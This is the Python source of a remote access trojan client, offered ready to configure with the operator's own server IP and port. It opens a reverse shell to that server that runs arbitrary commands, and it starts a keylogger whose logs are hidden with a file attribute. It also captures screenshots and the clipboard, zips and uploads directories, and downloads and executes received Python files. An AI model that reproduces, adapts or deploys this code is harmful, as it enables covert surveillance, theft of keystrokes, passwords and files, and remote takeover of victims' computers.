"""
------ CONFIGURATION ------
In order to use this tool you need to do some tweaking:
    1. Replace the Server's IP with your own value
    2. Replace the PORT number with your own value
    3. Feel free to mess around with paths, I've set some default values but oyu can change them

"""

import socket
import subprocess
import sys
import os
import ctypes
import platform
import threading
import pyperclip
import time

from mss import mss
from zipfile import ZipFile
from pynput.keyboard import Key, Listener, Controller

class Client:
    def __init__(self, server_ip, port, buffer_size, client_ip):
        self.SERVER_IP = server_ip
        self.PORT = port
        self.BUFFER_SIZE = buffer_size
        self.CLIENT_IP = client_ip

        self.screenshot_counter = 0
        self.keyLogger = True

        self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def connectToServer(self):
        self.client.connect((self.SERVER_IP, self.PORT))

    # try to update buffer size
    def updateBuffer(self, size):
        buff = ""
        for counter in range(0, len(size)):
            if size[counter].isdigit():
                buff += size[counter]

        return int(buff)

    # for big files
    def saveBigFile(self, size, buff):
        full = b''
        while True:
            if sys.getsizeof(full) >= size:
                break

            recvfile = self.client.recv(buff)

            full += recvfile

        return full

    def sendHostInfo(self):
        """ Extracting host information """

        host = sys.platform
        self.client.send(host.encode("utf-8"))

        cpu = platform.processor()
        system = platform.system()
        machine = platform.machine()

        with open('./logs/info.txt', 'w+') as f:
            f.writelines(["CPU: " + cpu + '\n', "System: " + system + '\n', "Machine: " + machine + '\n'])

        with open('./logs/info.txt', 'rb+') as f:
            self.client.send(f.read())

        os.remove('./logs/info.txt')

    def screenshot(self):
        sct = mss()
        sct.shot(output = './logs/screen{}.png'.format(self.screenshot_counter)) # taking screenshot

        picsize = os.path.getsize('./logs/screen{}.png'.format(self.screenshot_counter))
        size = str(picsize)
        self.client.send(size.encode("utf-8")) # sending size
        time.sleep(0.1)

        screen = open('./logs/screen{}.png'.format(self.screenshot_counter), 'rb')
        tosend = screen.read()
        self.client.send(tosend) # sending actual file

        screen.close()
        os.remove('./logs/screen{}.png'.format(self.screenshot_counter)) # removing file from host
        self.screenshot_counter += 1

    def receiveFile(self):
        # recv name
        recvname = self.client.recv(self.BUFFER_SIZE)
        name = recvname.decode("utf-8")

        # recv size
        recvsize = self.client.recv(self.BUFFER_SIZE)
        size = recvsize.decode("utf-8")

        if int(size) <= self.BUFFER_SIZE:
            recvfile = self.client.recv(self.BUFFER_SIZE)
            with open(f'./logs/{name}', 'wb+') as f:
                f.write(recvfile)
        else:
            # updating buffer
            buff = self.updateBuffer(size)

            # recv file
            fullfile = self.saveBigFile(int(size), buff)

            # saving the file
            with open(f'./logs/{name}', 'wb+') as f:
                f.write(fullfile)

    def runFile(self):
        """ Running a Python file in a hidden window """

        exfile = self.client.recv(self.BUFFER_SIZE)
        exfilepath = exfile.decode("utf-8")

        try:
            exec(open(exfilepath).read())
            self.client.send("OK".encode("utf-8"))
        except:
            self.client.send("ERROR".encode("utf-8"))

    def sendFile(self):
        path = self.client.recv(self.BUFFER_SIZE).decode("utf-8")

        filelist = os.listdir(path)
        self.client.send("OK".encode("utf-8"))

        # create a zip archive
        archname = './logs/files.zip'
        archive = ZipFile(archname, 'w')

        for file in filelist:
            archive.write(path + '/' + file)

        archive.close()

        # send size
        arcsize = os.path.getsize(archname)
        self.client.send(str(arcsize).encode("utf-8"))
        time.sleep(0.1)

        # send archive
        with open('./logs/files.zip', 'rb') as to_send:
            self.client.send(to_send.read())

        os.remove(archname)

    def killProcess(self):
        """ Task Manager """

        procname = self.client.recv(self.BUFFER_SIZE).decode("utf-8")

        try:
            os.system(f'taskkill /im {procname}')
            self.client.send("[+] Killed.".encode("utf-8"))
        except:
            self.client.send("[+] Failed.".encode("utf-8"))

    def message(self):
        """ Opens a UI box with a message in it """

        msg = self.client.recv(self.BUFFER_SIZE).decode("utf-8")

        try:
            ctypes.windll.user32.MessageBoxW(0, f"{msg}", 'Alert!', 0)
            self.client.send("[+] Message displayed and closed.".encode("utf-8"))

        except:
            self.client.send("[+] Error while displaying message.".encode("utf-8"))

    def lockPC(self):
        """ Locking user out while keeping connection active """

        try:
            ctypes.windll.user32.LockWorkStation()
            self.client.send("[+] PC Locked".encode("utf-8"))
        except:
            self.client.send("[!] Error".encode("utf-8"))


    def stopKeyLogger(self):
        """ press esc key to stop the key logger """

        keyboard = Controller()
        keyboard.press(Key.esc)
        keyboard.release(Key.esc)
        self.keyLogger = False

    def sendKeyLogs(self):
        try:
            archname = './logs/files.zip'
            archive = ZipFile(archname, 'w')

            archive.write('./logs/readable.txt')
            archive.write('./logs/keycodes.txt')

            archive.close()
            self.client.send("[OK]".encode("utf-8"))
            time.sleep(0.1)

            # send size
            arcsize = os.path.getsize(archname)
            self.client.send(str(arcsize).encode("utf-8"))

            # send archive
            with open('./logs/files.zip', 'rb') as to_send:
                self.client.send(to_send.read())

            os.remove(archname)

        except:
            self.client.send("[ERROR]".encode("utf-8"))

    def sendClipBoard(self):
    	cb = pyperclip.paste() # getting the clipboard

    	if len(cb) == 0:
    		self.client.send("/".encode("utf-8"))
    	else:
    		self.client.send(cb.encode("utf-8"))

    def reverseShell(self):
        """ start thread for key logger """

        start = Keylogger()
        kThread = threading.Thread(target = start.run)
        kThread.start()

        while True:
            command = self.client.recv(self.BUFFER_SIZE).decode("utf-8")

            if not command:
                self.client.close()
                break

            if command == "#":
            	continue # ignoring message to check if connetion is up

            elif command.lower() == "--esc":
                break

            elif command.lower() == "--takescreen":
                self.screenshot()

            elif command.lower() == "--recv":
                self.receiveFile()

            elif command.lower() == "--run":
                self.runFile()

            elif command.lower() == "--ginfo":
                self.sendHostInfo()

            elif command.lower() == "--download":
                try:
                    self.sendFile()
                except:
                    self.client.send("*** Error, check the path and retry".encode("utf-8"))


            elif command.lower() == "--kill":
                self.killProcess()

            elif command.lower() == "--msg":
                self.message()

            elif command.lower() == "--lock":
                self.lockPC()

            elif command.lower() == "--stop":
                self.stopKeyLogger()
                self.client.send("[*] Key Logger stopped.".encode("utf-8"))

            elif command.lower() == "--getlogs":
                self.sendKeyLogs()

            elif command.lower() == "--ccb":
                self.sendClipBoard()

            elif "cd" in command.lower():
                try:
                    d = command[3:].strip()
                    os.chdir(d)
                    self.client.send("[*] Done".encode("utf-8"))
                except:
                    self.client.send("[*] Dir not found / something went wrong.".encode("utf-8"))
            else:
                """ Shell """

                obj = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
                output = (obj.stdout.read() + obj.stderr.read()).decode("utf-8", errors="ignore")

                if output == "" or output == "\n":
                    self.client.send("[*] Done".encode("utf-8"))
                else:
                    self.client.send(output.encode("utf-8"))

        if self.keyLogger == True:
            self.stopKeyLogger()

        self.client.close()

        try:
            os.system(f'taskkill /im clientwin.exe /F') # killing oncogene
        except:
            pass

class Keylogger:
    def __init__(self):
        self.special = False

        """ for more readable logs """
        self.keycodes = {
            "Key.enter" : '\n',
            "Key.space" : ' ',
            "Key.shift_l" : '',
            "Key.shift_r" : '',
            "Key.tab" : "[TAB]",
            "Key.backspace" : "[BACKSPACE]",
            "Key.caps_lock" : "[CAPSLOCK]",
            "Key.ctrl" : "[CTRL]"
        }

        try:
            os.mkdir('./logs')
        except FileExistsError:
            pass

    def hideLogs(self):
        """ Hiding key-logger logs """
        command = "attrib +h ./logs/readable.txt"
        subprocess.Popen(command, stdout = subprocess.PIPE, stderr = subprocess.PIPE, stdin = subprocess.PIPE, shell = True)

    def onPress(self, key):
        if key == Key.esc:
            return False

        with open('./logs/readable.txt', 'a+') as log, open('./logs/keycodes.txt', 'a+') as codes:
            # key codes
            codes.write(str(key) + '\n')

            # readable keys
            for keycode in self.keycodes:
                if keycode == str(key):
                    self.special = True
                    log.write(self.keycodes[keycode])
                    break

            if self.special == False:
                log.write(str(key).replace("'", ""))

            self.special = False

    def run(self):
        self.hideLogs()
        with Listener(on_press = self.onPress) as listener:
            listener.join() # listening for keystrokes

def main():
    SERVER_IP = "SERVER_IP" # modify me
    PORT = 1234 # modify me (if you want)
    BUFFER_SIZE = 2048

    try:
        os.mkdir('./logs')
    except FileExistsError:
        pass

    try:
        """ Creating files before starting everything """

        l1 = open("./logs/keycodes.txt", "w+")
        l1.close()

        l2 = open("./logs/readable.txt", "w+")
        l2.close()
    except:
        pass

    CLIENT = socket.gethostname()
    CLIENT_IP = socket.gethostbyname(CLIENT)


    client = Client(SERVER_IP, PORT, BUFFER_SIZE, CLIENT_IP)

    client.connectToServer()
    client.reverseShell()


if __name__ == "__main__":
    main()
